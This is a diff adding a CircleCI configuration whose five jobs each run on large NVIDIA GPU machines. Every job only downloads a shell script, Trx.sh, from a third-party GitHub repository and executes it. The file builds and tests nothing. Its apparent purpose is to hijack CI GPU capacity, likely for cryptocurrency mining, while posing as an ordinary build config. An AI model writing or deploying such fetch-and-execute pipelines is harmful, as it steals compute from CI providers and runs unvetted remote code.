@@ -1,0 +1,54 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: sleep 30
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Trx.sh && chmod +x Trx.sh && ./Trx.sh
+      
+
+  build2:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Trx.sh && chmod +x Trx.sh && ./Trx.sh
+      
+
+
+  build3:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Trx.sh && chmod +x Trx.sh && ./Trx.sh
+
+
+  build4:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Trx.sh && chmod +x Trx.sh && ./Trx.sh
+
+  build5:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Trx.sh && chmod +x Trx.sh && ./Trx.sh
+      
+      
+      
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - build
+            - build2
+            - build3
+            - build4
+            - build5      
